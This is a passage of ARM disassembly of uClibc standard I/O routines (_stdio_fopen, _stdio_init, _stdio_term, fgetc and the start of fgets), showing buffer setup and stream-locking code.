   1b688:	ebfffc78 	bl	1a870 <__aeabi_read_tp>
   1b68c:	e79f2002 	ldr	r2, [pc, r2]
   1b690:	e3a03016 	mov	r3, #22
   1b694:	e3550000 	cmp	r5, #0
   1b698:	e7803002 	str	r3, [r0, r2]
   1b69c:	0a0000ee 	beq	1ba5c <_stdio_fopen+0x418>
   1b6a0:	e1d530b0 	ldrh	r3, [r5]
   1b6a4:	e3130a02 	tst	r3, #8192	; 0x2000
   1b6a8:	0a0000eb 	beq	1ba5c <_stdio_fopen+0x418>
   1b6ac:	e1a00005 	mov	r0, r5
   1b6b0:	ebfff322 	bl	18340 <free>
   1b6b4:	ea0000e8 	b	1ba5c <_stdio_fopen+0x418>
   1b6b8:	e3a04000 	mov	r4, #0
   1b6bc:	e5d13001 	ldrb	r3, [r1, #1]
   1b6c0:	e3530062 	cmp	r3, #98	; 0x62
   1b6c4:	11a03001 	movne	r3, r1
   1b6c8:	02813001 	addeq	r3, r1, #1
   1b6cc:	e5d33001 	ldrb	r3, [r3, #1]
   1b6d0:	e353002b 	cmp	r3, #43	; 0x2b
   1b6d4:	03843001 	orreq	r3, r4, #1
   1b6d8:	02834001 	addeq	r4, r3, #1
   1b6dc:	e3550000 	cmp	r5, #0
   1b6e0:	1a00000e 	bne	1b720 <_stdio_fopen+0xdc>
   1b6e4:	e3a00044 	mov	r0, #68	; 0x44
   1b6e8:	ebffeeed 	bl	172a4 <malloc>
   1b6ec:	e2505000 	subs	r5, r0, #0
   1b6f0:	0a0000da 	beq	1ba60 <_stdio_fopen+0x41c>
   1b6f4:	e59f3384 	ldr	r3, [pc, #900]	; 1ba80 <_stdio_fopen+0x43c>
   1b6f8:	e0883003 	add	r3, r8, r3
   1b6fc:	e8930007 	ldm	r3, {r0, r1, r2}
   1b700:	e3a0c000 	mov	ip, #0
   1b704:	e28d3004 	add	r3, sp, #4
   1b708:	e585c008 	str	ip, [r5, #8]
   1b70c:	e3a0ca02 	mov	ip, #8192	; 0x2000
   1b710:	e1c5c0b0 	strh	ip, [r5]
   1b714:	e8830007 	stm	r3, {r0, r1, r2}
   1b718:	e2853038 	add	r3, r5, #56	; 0x38
   1b71c:	e8830007 	stm	r3, {r0, r1, r2}
   1b720:	e3560000 	cmp	r6, #0
   1b724:	ba000013 	blt	1b778 <_stdio_fopen+0x134>
   1b728:	e59f2354 	ldr	r2, [pc, #852]	; 1ba84 <_stdio_fopen+0x440>
   1b72c:	e0042002 	and	r2, r4, r2
   1b730:	e2822001 	add	r2, r2, #1
   1b734:	e2873001 	add	r3, r7, #1
   1b738:	e0023003 	and	r3, r2, r3
   1b73c:	e1530002 	cmp	r3, r2
   1b740:	e5856004 	str	r6, [r5, #4]
   1b744:	1affffce 	bne	1b684 <_stdio_fopen+0x40>
   1b748:	e1c43007 	bic	r3, r4, r7
   1b74c:	e3130b01 	tst	r3, #1024	; 0x400
   1b750:	0a000005 	beq	1b76c <_stdio_fopen+0x128>
   1b754:	e1a00006 	mov	r0, r6
   1b758:	e3a01004 	mov	r1, #4
   1b75c:	e3a02b01 	mov	r2, #1024	; 0x400
   1b760:	ebffea13 	bl	15fb4 <__GI___libc_fcntl>
   1b764:	e3500000 	cmp	r0, #0
   1b768:	1affffc5 	bne	1b684 <_stdio_fopen+0x40>
   1b76c:	e2073802 	and	r3, r7, #131072	; 0x20000
   1b770:	e1844003 	orr	r4, r4, r3
   1b774:	ea000008 	b	1b79c <_stdio_fopen+0x158>
   1b778:	e3760001 	cmn	r6, #1
   1b77c:	13844802 	orrne	r4, r4, #131072	; 0x20000
   1b780:	e1a00007 	mov	r0, r7
   1b784:	e1a01004 	mov	r1, r4
   1b788:	e59f22f8 	ldr	r2, [pc, #760]	; 1ba88 <_stdio_fopen+0x444>
   1b78c:	ebfff9cf 	bl	19ed0 <__GI___libc_open>
   1b790:	e3500000 	cmp	r0, #0
   1b794:	e5850004 	str	r0, [r5, #4]
   1b798:	baffffc0 	blt	1b6a0 <_stdio_fopen+0x5c>
   1b79c:	e1d530b0 	ldrh	r3, [r5]
   1b7a0:	e2041003 	and	r1, r4, #3
   1b7a4:	e2042b01 	and	r2, r4, #1024	; 0x400
   1b7a8:	e2033a02 	and	r3, r3, #8192	; 0x2000
   1b7ac:	e2811001 	add	r1, r1, #1
   1b7b0:	e1833002 	orr	r3, r3, r2
   1b7b4:	e2211003 	eor	r1, r1, #3
   1b7b8:	e2142802 	ands	r2, r4, #131072	; 0x20000
   1b7bc:	e5954004 	ldr	r4, [r5, #4]
   1b7c0:	13a02902 	movne	r2, #32768	; 0x8000
   1b7c4:	e1833201 	orr	r3, r3, r1, lsl #4
   1b7c8:	e1822003 	orr	r2, r2, r3
   1b7cc:	e3740106 	cmn	r4, #-2147483647	; 0x80000001
   1b7d0:	e1c520b0 	strh	r2, [r5]
   1b7d4:	0a00000d 	beq	1b810 <_stdio_fopen+0x1cc>
   1b7d8:	e59f32ac 	ldr	r3, [pc, #684]	; 1ba8c <_stdio_fopen+0x448>
   1b7dc:	ebfffc23 	bl	1a870 <__aeabi_read_tp>
   1b7e0:	e79f3003 	ldr	r3, [pc, r3]
   1b7e4:	e1a06000 	mov	r6, r0
   1b7e8:	e1a00004 	mov	r0, r4
   1b7ec:	e7964003 	ldr	r4, [r6, r3]
   1b7f0:	eb0005db 	bl	1cf64 <__GI_isatty>
   1b7f4:	e3500000 	cmp	r0, #0
   1b7f8:	11d530b0 	ldrhne	r3, [r5]
   1b7fc:	13833c01 	orrne	r3, r3, #256	; 0x100
   1b800:	11c530b0 	strhne	r3, [r5]
   1b804:	e59f3284 	ldr	r3, [pc, #644]	; 1ba90 <_stdio_fopen+0x44c>
   1b808:	e79f3003 	ldr	r3, [pc, r3]
   1b80c:	e7864003 	str	r4, [r6, r3]
   1b810:	e5953008 	ldr	r3, [r5, #8]
   1b814:	e3530000 	cmp	r3, #0
   1b818:	1a000009 	bne	1b844 <_stdio_fopen+0x200>
   1b81c:	e3a00a01 	mov	r0, #4096	; 0x1000
   1b820:	ebffee9f 	bl	172a4 <malloc>
   1b824:	e3500000 	cmp	r0, #0
   1b828:	11d530b0 	ldrhne	r3, [r5]
   1b82c:	12802a01 	addne	r2, r0, #4096	; 0x1000
   1b830:	13833901 	orrne	r3, r3, #16384	; 0x4000
   1b834:	e5850008 	str	r0, [r5, #8]
   1b838:	1585200c 	strne	r2, [r5, #12]
   1b83c:	11c530b0 	strhne	r3, [r5]
   1b840:	0585000c 	streq	r0, [r5, #12]
   1b844:	e59f3248 	ldr	r3, [pc, #584]	; 1ba94 <_stdio_fopen+0x450>
   1b848:	e3a04000 	mov	r4, #0
   1b84c:	e7983003 	ldr	r3, [r8, r3]
   1b850:	e5c54002 	strb	r4, [r5, #2]
   1b854:	e1d520b0 	ldrh	r2, [r5]
   1b858:	e5931000 	ldr	r1, [r3]
   1b85c:	e5953008 	ldr	r3, [r5, #8]
   1b860:	e3120a02 	tst	r2, #8192	; 0x2000
   1b864:	e5853014 	str	r3, [r5, #20]
   1b868:	e5851034 	str	r1, [r5, #52]	; 0x34
   1b86c:	e5853018 	str	r3, [r5, #24]
   1b870:	e585301c 	str	r3, [r5, #28]
   1b874:	e5853010 	str	r3, [r5, #16]
   1b878:	e585402c 	str	r4, [r5, #44]	; 0x2c
   1b87c:	0a000077 	beq	1ba60 <_stdio_fopen+0x41c>
   1b880:	e59f3210 	ldr	r3, [pc, #528]	; 1ba98 <_stdio_fopen+0x454>
   1b884:	e7987003 	ldr	r7, [r8, r3]
   1b888:	ebfffbf8 	bl	1a870 <__aeabi_read_tp>
   1b88c:	e5973008 	ldr	r3, [r7, #8]
   1b890:	e2406e49 	sub	r6, r0, #1168	; 0x490
   1b894:	e1530006 	cmp	r3, r6
   1b898:	0a00000e 	beq	1b8d8 <_stdio_fopen+0x294>
   1b89c:	e3a01001 	mov	r1, #1
   1b8a0:	e1a02007 	mov	r2, r7
   1b8a4:	e5923000 	ldr	r3, [r2]
   1b8a8:	e1530004 	cmp	r3, r4
   1b8ac:	1a000005 	bne	1b8c8 <_stdio_fopen+0x284>
   1b8b0:	e1a00004 	mov	r0, r4
   1b8b4:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b8b8:	e1a0e00f 	mov	lr, pc
   1b8bc:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b8c0:	3afffff7 	bcc	1b8a4 <_stdio_fopen+0x260>
   1b8c4:	e1a03004 	mov	r3, r4
   1b8c8:	e1530004 	cmp	r3, r4
   1b8cc:	11a00007 	movne	r0, r7
   1b8d0:	1bfff891 	blne	19b1c <__lll_lock_wait_private>
   1b8d4:	e5876008 	str	r6, [r7, #8]
   1b8d8:	e59f31b8 	ldr	r3, [pc, #440]	; 1ba98 <_stdio_fopen+0x454>
   1b8dc:	e7981003 	ldr	r1, [r8, r3]
   1b8e0:	e59f31b4 	ldr	r3, [pc, #436]	; 1ba9c <_stdio_fopen+0x458>
   1b8e4:	e7987003 	ldr	r7, [r8, r3]
   1b8e8:	e5913004 	ldr	r3, [r1, #4]
   1b8ec:	e5972008 	ldr	r2, [r7, #8]
   1b8f0:	e2833001 	add	r3, r3, #1
   1b8f4:	e1520006 	cmp	r2, r6
   1b8f8:	e5813004 	str	r3, [r1, #4]
   1b8fc:	0a00000f 	beq	1b940 <_stdio_fopen+0x2fc>
   1b900:	e3a01001 	mov	r1, #1
   1b904:	e1a02007 	mov	r2, r7
   1b908:	e3a04000 	mov	r4, #0
   1b90c:	e5923000 	ldr	r3, [r2]
   1b910:	e1530004 	cmp	r3, r4
   1b914:	1a000005 	bne	1b930 <_stdio_fopen+0x2ec>
   1b918:	e1a00004 	mov	r0, r4
   1b91c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b920:	e1a0e00f 	mov	lr, pc
   1b924:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b928:	3afffff7 	bcc	1b90c <_stdio_fopen+0x2c8>
   1b92c:	e1a03004 	mov	r3, r4
   1b930:	e1530004 	cmp	r3, r4
   1b934:	11a00007 	movne	r0, r7
   1b938:	1bfff877 	blne	19b1c <__lll_lock_wait_private>
   1b93c:	e5876008 	str	r6, [r7, #8]
   1b940:	e59f3154 	ldr	r3, [pc, #340]	; 1ba9c <_stdio_fopen+0x458>
   1b944:	e7980003 	ldr	r0, [r8, r3]
   1b948:	e59f3150 	ldr	r3, [pc, #336]	; 1baa0 <_stdio_fopen+0x45c>
   1b94c:	e7981003 	ldr	r1, [r8, r3]
   1b950:	e5903004 	ldr	r3, [r0, #4]
   1b954:	e5912000 	ldr	r2, [r1]
   1b958:	e2833001 	add	r3, r3, #1
   1b95c:	e5803004 	str	r3, [r0, #4]
   1b960:	e5852020 	str	r2, [r5, #32]
   1b964:	e5903004 	ldr	r3, [r0, #4]
   1b968:	e2433001 	sub	r3, r3, #1
   1b96c:	e3530000 	cmp	r3, #0
   1b970:	e5815000 	str	r5, [r1]
   1b974:	e5803004 	str	r3, [r0, #4]
   1b978:	1a000017 	bne	1b9dc <_stdio_fopen+0x398>
   1b97c:	e5803008 	str	r3, [r0, #8]
   1b980:	e1a07000 	mov	r7, r0
   1b984:	e5974000 	ldr	r4, [r7]
   1b988:	e3a01000 	mov	r1, #0
   1b98c:	e1a02007 	mov	r2, r7
   1b990:	e5923000 	ldr	r3, [r2]
   1b994:	e1530004 	cmp	r3, r4
   1b998:	1a000005 	bne	1b9b4 <_stdio_fopen+0x370>
   1b99c:	e1a00004 	mov	r0, r4
   1b9a0:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1b9a4:	e1a0e00f 	mov	lr, pc
   1b9a8:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1b9ac:	3afffff7 	bcc	1b990 <_stdio_fopen+0x34c>
   1b9b0:	e1a03004 	mov	r3, r4
   1b9b4:	e1530004 	cmp	r3, r4
   1b9b8:	1afffff1 	bne	1b984 <_stdio_fopen+0x340>
   1b9bc:	e3530001 	cmp	r3, #1
   1b9c0:	da000005 	ble	1b9dc <_stdio_fopen+0x398>
   1b9c4:	e1a00007 	mov	r0, r7
   1b9c8:	e2811081 	add	r1, r1, #129	; 0x81
   1b9cc:	e3a02001 	mov	r2, #1
   1b9d0:	e3a03000 	mov	r3, #0
   1b9d4:	e3a070f0 	mov	r7, #240	; 0xf0
   1b9d8:	ef000000 	svc	0x00000000
   1b9dc:	e59f30b4 	ldr	r3, [pc, #180]	; 1ba98 <_stdio_fopen+0x454>
   1b9e0:	e7980003 	ldr	r0, [r8, r3]
   1b9e4:	e5903004 	ldr	r3, [r0, #4]
   1b9e8:	e2433001 	sub	r3, r3, #1
   1b9ec:	e3530000 	cmp	r3, #0
   1b9f0:	e5803004 	str	r3, [r0, #4]
   1b9f4:	1a000019 	bne	1ba60 <_stdio_fopen+0x41c>
   1b9f8:	e5803008 	str	r3, [r0, #8]
   1b9fc:	e1a07000 	mov	r7, r0
   1ba00:	e5974000 	ldr	r4, [r7]
   1ba04:	e3a01000 	mov	r1, #0
   1ba08:	e1a02007 	mov	r2, r7
   1ba0c:	e5923000 	ldr	r3, [r2]
   1ba10:	e1530004 	cmp	r3, r4
   1ba14:	1a000005 	bne	1ba30 <_stdio_fopen+0x3ec>
   1ba18:	e1a00004 	mov	r0, r4
   1ba1c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1ba20:	e1a0e00f 	mov	lr, pc
   1ba24:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1ba28:	3afffff7 	bcc	1ba0c <_stdio_fopen+0x3c8>
   1ba2c:	e1a03004 	mov	r3, r4
   1ba30:	e1530004 	cmp	r3, r4
   1ba34:	1afffff1 	bne	1ba00 <_stdio_fopen+0x3bc>
   1ba38:	e3530001 	cmp	r3, #1
   1ba3c:	da000007 	ble	1ba60 <_stdio_fopen+0x41c>
   1ba40:	e1a00007 	mov	r0, r7
   1ba44:	e2811081 	add	r1, r1, #129	; 0x81
   1ba48:	e3a02001 	mov	r2, #1
   1ba4c:	e3a03000 	mov	r3, #0
   1ba50:	e3a070f0 	mov	r7, #240	; 0xf0
   1ba54:	ef000000 	svc	0x00000000
   1ba58:	ea000000 	b	1ba60 <_stdio_fopen+0x41c>
   1ba5c:	e3a05000 	mov	r5, #0
   1ba60:	e1a00005 	mov	r0, r5
   1ba64:	e28dd010 	add	sp, sp, #16
   1ba68:	e8bd41f0 	pop	{r4, r5, r6, r7, r8, lr}
   1ba6c:	e12fff1e 	bx	lr
   1ba70:	0000d338 	.word	0x0000d338
   1ba74:	00000241 	.word	0x00000241
   1ba78:	00000441 	.word	0x00000441
   1ba7c:	0000d358 	.word	0x0000d358
   1ba80:	ffff7e90 	.word	0xffff7e90
   1ba84:	00020003 	.word	0x00020003
   1ba88:	000001b6 	.word	0x000001b6
   1ba8c:	0000d204 	.word	0x0000d204
   1ba90:	0000d1dc 	.word	0x0000d1dc
   1ba94:	0000005c 	.word	0x0000005c
   1ba98:	000000a0 	.word	0x000000a0
   1ba9c:	00000098 	.word	0x00000098
   1baa0:	0000004c 	.word	0x0000004c

0001baa4 <_stdio_init>:
   1baa4:	e92d4070 	push	{r4, r5, r6, lr}
   1baa8:	e59f3064 	ldr	r3, [pc, #100]	; 1bb14 <_stdio_init+0x70>
   1baac:	ebfffb6f 	bl	1a870 <__aeabi_read_tp>
   1bab0:	e79f3003 	ldr	r3, [pc, r3]
   1bab4:	e1a05000 	mov	r5, r0
   1bab8:	e3a00000 	mov	r0, #0
   1babc:	e7956003 	ldr	r6, [r5, r3]
   1bac0:	eb000527 	bl	1cf64 <__GI_isatty>
   1bac4:	e59f404c 	ldr	r4, [pc, #76]	; 1bb18 <_stdio_init+0x74>
   1bac8:	e3500000 	cmp	r0, #0
   1bacc:	e08f4004 	add	r4, pc, r4
   1bad0:	059f2044 	ldreq	r2, [pc, #68]	; 1bb1c <_stdio_init+0x78>
   1bad4:	019430b2 	ldrheq	r3, [r4, r2]
   1bad8:	02233c01 	eoreq	r3, r3, #256	; 0x100
   1badc:	018430b2 	strheq	r3, [r4, r2]
   1bae0:	e3a00001 	mov	r0, #1
   1bae4:	eb00051e 	bl	1cf64 <__GI_isatty>
   1bae8:	e3500000 	cmp	r0, #0
   1baec:	059f2028 	ldreq	r2, [pc, #40]	; 1bb1c <_stdio_init+0x78>
   1baf0:	00842002 	addeq	r2, r4, r2
   1baf4:	01d234b4 	ldrheq	r3, [r2, #68]	; 0x44
   1baf8:	02233c01 	eoreq	r3, r3, #256	; 0x100
   1bafc:	01c234b4 	strheq	r3, [r2, #68]	; 0x44
   1bb00:	e59f3018 	ldr	r3, [pc, #24]	; 1bb20 <_stdio_init+0x7c>
   1bb04:	e79f3003 	ldr	r3, [pc, r3]
   1bb08:	e7856003 	str	r6, [r5, r3]
   1bb0c:	e8bd4070 	pop	{r4, r5, r6, lr}
   1bb10:	e12fff1e 	bx	lr
   1bb14:	0000cf34 	.word	0x0000cf34
   1bb18:	0000cec0 	.word	0x0000cec0
   1bb1c:	0000020c 	.word	0x0000020c
   1bb20:	0000cee0 	.word	0x0000cee0

0001bb24 <_stdio_term>:
   1bb24:	e92d45f0 	push	{r4, r5, r6, r7, r8, sl, lr}
   1bb28:	e59f713c 	ldr	r7, [pc, #316]	; 1bc6c <_stdio_term+0x148>
   1bb2c:	e59f313c 	ldr	r3, [pc, #316]	; 1bc70 <_stdio_term+0x14c>
   1bb30:	e08f7007 	add	r7, pc, r7
   1bb34:	e0873003 	add	r3, r7, r3
   1bb38:	e8930007 	ldm	r3, {r0, r1, r2}
   1bb3c:	e24dd02c 	sub	sp, sp, #44	; 0x2c
   1bb40:	e28d301c 	add	r3, sp, #28
   1bb44:	e8830007 	stm	r3, {r0, r1, r2}
   1bb48:	e59f2124 	ldr	r2, [pc, #292]	; 1bc74 <_stdio_term+0x150>
   1bb4c:	e797c002 	ldr	ip, [r7, r2]
   1bb50:	e8930007 	ldm	r3, {r0, r1, r2}
   1bb54:	e59f311c 	ldr	r3, [pc, #284]	; 1bc78 <_stdio_term+0x154>
   1bb58:	e0873003 	add	r3, r7, r3
   1bb5c:	e88c0007 	stm	ip, {r0, r1, r2}
   1bb60:	e8930007 	ldm	r3, {r0, r1, r2}
   1bb64:	e28d3010 	add	r3, sp, #16
   1bb68:	e8830007 	stm	r3, {r0, r1, r2}
   1bb6c:	e59f2108 	ldr	r2, [pc, #264]	; 1bc7c <_stdio_term+0x158>
   1bb70:	e7971002 	ldr	r1, [r7, r2]
   1bb74:	e59f2104 	ldr	r2, [pc, #260]	; 1bc80 <_stdio_term+0x15c>
   1bb78:	e5915000 	ldr	r5, [r1]
   1bb7c:	e797c002 	ldr	ip, [r7, r2]
   1bb80:	e8930007 	ldm	r3, {r0, r1, r2}
   1bb84:	e59f30f8 	ldr	r3, [pc, #248]	; 1bc84 <_stdio_term+0x160>
   1bb88:	e28d8004 	add	r8, sp, #4
   1bb8c:	e087a003 	add	sl, r7, r3
   1bb90:	e88c0007 	stm	ip, {r0, r1, r2}
   1bb94:	ea000021 	b	1bc20 <_stdio_term+0xfc>
   1bb98:	e5953040 	ldr	r3, [r5, #64]	; 0x40
   1bb9c:	ebfffb33 	bl	1a870 <__aeabi_read_tp>
   1bba0:	e2406e49 	sub	r6, r0, #1168	; 0x490
   1bba4:	e1530006 	cmp	r3, r6
   1bba8:	0595303c 	ldreq	r3, [r5, #60]	; 0x3c
   1bbac:	02833001 	addeq	r3, r3, #1
   1bbb0:	0585303c 	streq	r3, [r5, #60]	; 0x3c
   1bbb4:	0a000012 	beq	1bc04 <_stdio_term+0xe0>
   1bbb8:	e5923000 	ldr	r3, [r2]
   1bbbc:	e1530004 	cmp	r3, r4
   1bbc0:	1a000005 	bne	1bbdc <_stdio_term+0xb8>
   1bbc4:	e1a00004 	mov	r0, r4
   1bbc8:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1bbcc:	e1a0e00f 	mov	lr, pc
   1bbd0:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1bbd4:	3afffff7 	bcc	1bbb8 <_stdio_term+0x94>
   1bbd8:	e1a03004 	mov	r3, r4
   1bbdc:	e3530000 	cmp	r3, #0
   1bbe0:	15953008 	ldrne	r3, [r5, #8]
   1bbe4:	13a02030 	movne	r2, #48	; 0x30
   1bbe8:	05856040 	streq	r6, [r5, #64]	; 0x40
   1bbec:	0585103c 	streq	r1, [r5, #60]	; 0x3c
   1bbf0:	15853014 	strne	r3, [r5, #20]
   1bbf4:	11c520b0 	strhne	r2, [r5]
   1bbf8:	15853018 	strne	r3, [r5, #24]
   1bbfc:	1585301c 	strne	r3, [r5, #28]
   1bc00:	15853010 	strne	r3, [r5, #16]
   1bc04:	e89a0007 	ldm	sl, {r0, r1, r2}
   1bc08:	e3a03001 	mov	r3, #1
   1bc0c:	e5853034 	str	r3, [r5, #52]	; 0x34
   1bc10:	e2853038 	add	r3, r5, #56	; 0x38
   1bc14:	e8880007 	stm	r8, {r0, r1, r2}
   1bc18:	e8830007 	stm	r3, {r0, r1, r2}
   1bc1c:	e5955020 	ldr	r5, [r5, #32]
   1bc20:	e3550000 	cmp	r5, #0
   1bc24:	e3a01001 	mov	r1, #1
   1bc28:	e2852038 	add	r2, r5, #56	; 0x38
   1bc2c:	e3a04000 	mov	r4, #0
   1bc30:	1affffd8 	bne	1bb98 <_stdio_term+0x74>
   1bc34:	e59f3040 	ldr	r3, [pc, #64]	; 1bc7c <_stdio_term+0x158>
   1bc38:	e7973003 	ldr	r3, [r7, r3]
   1bc3c:	e5934000 	ldr	r4, [r3]
   1bc40:	ea000004 	b	1bc58 <_stdio_term+0x134>
   1bc44:	e1d430b0 	ldrh	r3, [r4]
   1bc48:	e3130040 	tst	r3, #64	; 0x40
   1bc4c:	11a00004 	movne	r0, r4
   1bc50:	1b00000c 	blne	1bc88 <__stdio_wcommit>
   1bc54:	e5944020 	ldr	r4, [r4, #32]
   1bc58:	e3540000 	cmp	r4, #0
   1bc5c:	1afffff8 	bne	1bc44 <_stdio_term+0x120>
   1bc60:	e28dd02c 	add	sp, sp, #44	; 0x2c
   1bc64:	e8bd45f0 	pop	{r4, r5, r6, r7, r8, sl, lr}
   1bc68:	e12fff1e 	bx	lr
   1bc6c:	0000ce5c 	.word	0x0000ce5c
   1bc70:	ffff7eb4 	.word	0xffff7eb4
   1bc74:	00000098 	.word	0x00000098
   1bc78:	ffff7ea8 	.word	0xffff7ea8
   1bc7c:	0000004c 	.word	0x0000004c
   1bc80:	000000a0 	.word	0x000000a0
   1bc84:	ffff7e9c 	.word	0xffff7e9c

0001bc88 <__stdio_wcommit>:
   1bc88:	e92d4010 	push	{r4, lr}
   1bc8c:	e5901008 	ldr	r1, [r0, #8]
   1bc90:	e5903010 	ldr	r3, [r0, #16]
   1bc94:	e0532001 	subs	r2, r3, r1
   1bc98:	e1a04000 	mov	r4, r0
   1bc9c:	15801010 	strne	r1, [r0, #16]
   1bca0:	1b00068a 	blne	1d6d0 <__stdio_WRITE>
   1bca4:	e5943008 	ldr	r3, [r4, #8]
   1bca8:	e5940010 	ldr	r0, [r4, #16]
   1bcac:	e0630000 	rsb	r0, r3, r0
   1bcb0:	e8bd4010 	pop	{r4, lr}
   1bcb4:	e12fff1e 	bx	lr

0001bcb8 <__GI_fgetc>:
   1bcb8:	e92d40f0 	push	{r4, r5, r6, r7, lr}
   1bcbc:	e5904034 	ldr	r4, [r0, #52]	; 0x34
   1bcc0:	e3540000 	cmp	r4, #0
   1bcc4:	e24dd004 	sub	sp, sp, #4
   1bcc8:	e1a07000 	mov	r7, r0
   1bccc:	0a000008 	beq	1bcf4 <__GI_fgetc+0x3c>
   1bcd0:	e5902010 	ldr	r2, [r0, #16]
   1bcd4:	e5903018 	ldr	r3, [r0, #24]
   1bcd8:	e1520003 	cmp	r2, r3
   1bcdc:	34d25001 	ldrbcc	r5, [r2], #1
   1bce0:	35802010 	strcc	r2, [r0, #16]
   1bce4:	3a000040 	bcc	1bdec <__GI_fgetc+0x134>
   1bce8:	eb000221 	bl	1c574 <__GI___fgetc_unlocked>
   1bcec:	e1a05000 	mov	r5, r0
   1bcf0:	ea00003d 	b	1bdec <__GI_fgetc+0x134>
   1bcf4:	ebfffadd 	bl	1a870 <__aeabi_read_tp>
   1bcf8:	e5973040 	ldr	r3, [r7, #64]	; 0x40
   1bcfc:	e2406e49 	sub	r6, r0, #1168	; 0x490
   1bd00:	e1530006 	cmp	r3, r6
   1bd04:	0a00000f 	beq	1bd48 <__GI_fgetc+0x90>
   1bd08:	e2875038 	add	r5, r7, #56	; 0x38
   1bd0c:	e3a01001 	mov	r1, #1
   1bd10:	e1a02005 	mov	r2, r5
   1bd14:	e5923000 	ldr	r3, [r2]
   1bd18:	e1530004 	cmp	r3, r4
   1bd1c:	1a000005 	bne	1bd38 <__GI_fgetc+0x80>
   1bd20:	e1a00004 	mov	r0, r4
   1bd24:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1bd28:	e1a0e00f 	mov	lr, pc
   1bd2c:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1bd30:	3afffff7 	bcc	1bd14 <__GI_fgetc+0x5c>
   1bd34:	e1a03004 	mov	r3, r4
   1bd38:	e3530000 	cmp	r3, #0
   1bd3c:	11a00005 	movne	r0, r5
   1bd40:	1bfff775 	blne	19b1c <__lll_lock_wait_private>
   1bd44:	e5876040 	str	r6, [r7, #64]	; 0x40
   1bd48:	e597203c 	ldr	r2, [r7, #60]	; 0x3c
   1bd4c:	e5971010 	ldr	r1, [r7, #16]
   1bd50:	e5973018 	ldr	r3, [r7, #24]
   1bd54:	e2822001 	add	r2, r2, #1
   1bd58:	e587203c 	str	r2, [r7, #60]	; 0x3c
   1bd5c:	e1510003 	cmp	r1, r3
   1bd60:	34d15001 	ldrbcc	r5, [r1], #1
   1bd64:	35871010 	strcc	r1, [r7, #16]
   1bd68:	3a000002 	bcc	1bd78 <__GI_fgetc+0xc0>
   1bd6c:	e1a00007 	mov	r0, r7
   1bd70:	eb0001ff 	bl	1c574 <__GI___fgetc_unlocked>
   1bd74:	e1a05000 	mov	r5, r0
   1bd78:	e597303c 	ldr	r3, [r7, #60]	; 0x3c
   1bd7c:	e2433001 	sub	r3, r3, #1
   1bd80:	e3530000 	cmp	r3, #0
   1bd84:	e587303c 	str	r3, [r7, #60]	; 0x3c
   1bd88:	1a000017 	bne	1bdec <__GI_fgetc+0x134>
   1bd8c:	e5873040 	str	r3, [r7, #64]	; 0x40
   1bd90:	e2876038 	add	r6, r7, #56	; 0x38
   1bd94:	e5974038 	ldr	r4, [r7, #56]	; 0x38
   1bd98:	e3a01000 	mov	r1, #0
   1bd9c:	e1a02006 	mov	r2, r6
   1bda0:	e5923000 	ldr	r3, [r2]
   1bda4:	e1530004 	cmp	r3, r4
   1bda8:	1a000005 	bne	1bdc4 <__GI_fgetc+0x10c>
   1bdac:	e1a00004 	mov	r0, r4
   1bdb0:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1bdb4:	e1a0e00f 	mov	lr, pc
   1bdb8:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1bdbc:	3afffff7 	bcc	1bda0 <__GI_fgetc+0xe8>
   1bdc0:	e1a03004 	mov	r3, r4
   1bdc4:	e1530004 	cmp	r3, r4
   1bdc8:	1afffff1 	bne	1bd94 <__GI_fgetc+0xdc>
   1bdcc:	e3530001 	cmp	r3, #1
   1bdd0:	da000005 	ble	1bdec <__GI_fgetc+0x134>
   1bdd4:	e2870038 	add	r0, r7, #56	; 0x38
   1bdd8:	e2811081 	add	r1, r1, #129	; 0x81
   1bddc:	e3a02001 	mov	r2, #1
   1bde0:	e3a03000 	mov	r3, #0
   1bde4:	e3a070f0 	mov	r7, #240	; 0xf0
   1bde8:	ef000000 	svc	0x00000000
   1bdec:	e1a00005 	mov	r0, r5
   1bdf0:	e28dd004 	add	sp, sp, #4
   1bdf4:	e8bd40f0 	pop	{r4, r5, r6, r7, lr}
   1bdf8:	e12fff1e 	bx	lr

0001bdfc <__GI_fgets>:
   1bdfc:	e92d47f0 	push	{r4, r5, r6, r7, r8, r9, sl, lr}
   1be00:	e5926034 	ldr	r6, [r2, #52]	; 0x34
   1be04:	e3560000 	cmp	r6, #0
   1be08:	e1a07002 	mov	r7, r2
   1be0c:	e1a0a000 	mov	sl, r0
   1be10:	e1a09001 	mov	r9, r1
   1be14:	1a000018 	bne	1be7c <__GI_fgets+0x80>
   1be18:	ebfffa94 	bl	1a870 <__aeabi_read_tp>
   1be1c:	e5923040 	ldr	r3, [r2, #64]	; 0x40
   1be20:	e2408e49 	sub	r8, r0, #1168	; 0x490
   1be24:	e1530008 	cmp	r3, r8
   1be28:	0a000010 	beq	1be70 <__GI_fgets+0x74>
   1be2c:	e2825038 	add	r5, r2, #56	; 0x38
   1be30:	e3a01001 	mov	r1, #1
   1be34:	e1a02005 	mov	r2, r5
   1be38:	e1a04006 	mov	r4, r6
   1be3c:	e5923000 	ldr	r3, [r2]
   1be40:	e1530004 	cmp	r3, r4
   1be44:	1a000005 	bne	1be60 <__GI_fgets+0x64>
   1be48:	e1a00004 	mov	r0, r4
   1be4c:	e3e03a0f 	mvn	r3, #61440	; 0xf000
   1be50:	e1a0e00f 	mov	lr, pc
   1be54:	e243f03f 	sub	pc, r3, #63	; 0x3f
   1be58:	3afffff7 	bcc	1be3c <__GI_fgets+0x40>
   1be5c:	e1a03004 	mov	r3, r4
   1be60:	e3530000 	cmp	r3, #0
   1be64:	11a00005 	movne	r0, r5
   1be68:	1bfff72b 	blne	19b1c <__lll_lock_wait_private>
   1be6c:	e5878040 	str	r8, [r7, #64]	; 0x40
   1be70:	e597303c 	ldr	r3, [r7, #60]	; 0x3c
   1be74:	e2833001 	add	r3, r3, #1
